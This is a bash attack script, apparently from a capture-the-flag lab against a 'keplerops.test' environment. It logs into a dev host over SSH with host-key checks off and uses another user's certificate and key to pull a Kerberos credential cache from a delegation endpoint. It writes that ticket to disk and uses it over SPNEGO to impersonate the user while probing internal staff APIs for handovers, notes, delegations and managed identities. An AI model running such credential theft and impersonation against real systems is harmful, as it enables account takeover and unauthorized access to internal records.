set +e
S="ssh -o BatchMode=yes -o StrictHostKeyChecking=no rowan-dev"
$S 'bash -s' <<'INNER'
set +e
CA=/home/rowan/.local/share/keplerops/ca.crt
S2=https://staff.keplerops.test
E=/home/rowan/work/certificates/evan.calderoux
D="$S2/api/archive/delegation/probe"
echo "=== get ccache for evan ==="
curl -sSk -m 10 --cacert $CA --cert $E.crt --key $E.key -X POST -H 'Content-Type: application/json' -d '{"spn":"HTTP/staff.keplerops.test@KEPLEROPS.TEST"}' "$D" > /tmp/cc.json
python3 - <<'PY'
import json,base64
d=json.load(open('/tmp/cc.json'))
open('/home/rowan/work/krb5cc_evan','wb').write(base64.b64decode(d['credential_cache']))
print('flag',d.get('flag'),'auth',d.get('authentication'))
PY
export KRB5CCNAME=FILE:/home/rowan/work/krb5cc_evan
echo "=== klist ==="; klist -e 2>&1 | head -20
echo "=== SPNEGO staff GETs ==="
for p in "/" "/dashboard" "/api/service-directory" "/api/archive/handovers/evan.calderoux@keplerops.test" "/api/archive/handovers/cinder" "/api/notes/NOTE-SUP-2841-7" "/api/archive" "/api/archive/cases" "/api/archive/delegations" "/api/managed-identities"; do
 echo "--- GET $p"
 curl -sSk -m 10 --cacert $CA --negotiate -u : -w '\n[%{http_code}]\n' "$S2$p" | head -c 1500; echo
done
echo "=== SPNEGO delegation probe ==="
for b in '{}' '{"spn":"HTTP/staff.keplerops.test@KEPLEROPS.TEST"}'; do
 echo "--- $b"
 curl -sSk -m 10 --cacert $CA --negotiate -u : -X POST -H 'Content-Type: application/json' -d "$b" -w '\n[%{http_code}]\n' "$D" | head -c 800; echo
done
INNER
echo DONE_R41
